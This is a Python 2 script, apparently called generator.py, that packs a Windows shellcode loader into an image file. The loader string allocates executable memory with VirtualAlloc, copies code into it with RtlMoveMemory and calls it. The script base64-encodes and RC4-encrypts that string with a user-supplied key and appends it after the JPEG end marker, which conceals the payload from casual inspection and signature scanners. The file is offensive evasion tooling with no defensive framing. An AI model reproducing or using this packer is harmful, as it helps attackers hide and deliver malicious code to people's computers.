'''#!/usr/bin/env python2.7'''
# -*- coding: utf-8 -*-
import hashlib,base64,sys,os

shellcode = "VirtualAlloc = windll.kernel32.VirtualAlloc;VirtualProtect=windll.kernel32.VirtualProtect;useless+=random.choice(useless);whnd=windll.kernel32.GetConsoleWindow();RtlMoveMemory=windll.kernel32.RtlMoveMemory;memHscode=VirtualAlloc(c_int(0),c_int(len(code)),c_int(0x3000),c_int(0x40));buf=(c_char*len(code)).from_buffer(code);useless+=random.choice(useless)[:-1];RtlMoveMemory(c_int(memHscode),buf,c_int(len(code)));runcode=cast(memHscode,CFUNCTYPE(c_void_p));runcode()"

def rc4(text,key):
    #Use md5(key) to get 32-bit key instead raw key
    key=hashlib.md5(key).hexdigest()
    result=''
    key_len=len(key)
    #1.init S-box
    box=list(range(256))#put 0-255 into S-box
    j=0
    for i in range(256):#shuffle elements in S-box according to key
        j=(j+box[i]+ord(key[i%key_len]))%256
        box[i],box[j]=box[j],box[i]#swap elements
    i=j=0
    for element in text:
        i=(i+1)%256
        j=(j+box[i])%256
        box[i],box[j]=box[j],box[i]
        k=chr(ord(element)^box[(box[i]+box[j])%256])
        result+=k
    result=base64.b64encode(result)
    return result

def main():
    if len(sys.argv)!=3:
        print("Usage:python generator.py YourRC4Key imgName")
        exit(0)
    else:
        key=sys.argv[1]
        imgName=sys.argv[2]
        if(not os.path.exists(imgName) or os.path.getsize(imgName)<=200):
            print("check your img param!")
            exit(0)
    #base64encode
    baseStr=base64.b64encode(shellcode)
    #RC4+base64encode
    payload=rc4(baseStr,key)
    with open(imgName,'rb') as f:
        img=f.read()
        fileend=img[-2:]
        if(ord(fileend[0])!=255 and ord(fileend[0])!=217):
            if(img.count(chr(255)+chr(217))>0):
                print("Please change the img.")
                exit(0)
            else:
                payload=img+chr(255)+chr(217)+payload
                print("Abnormal end of file,auto add \xff\xd9")
        else:
            payload=img+payload
        with open("shellcode_"+imgName,'wb') as f1:
            f1.write(payload)
    print("Payload has write to shellcode_"+imgName)
if __name__=="__main__":
    main()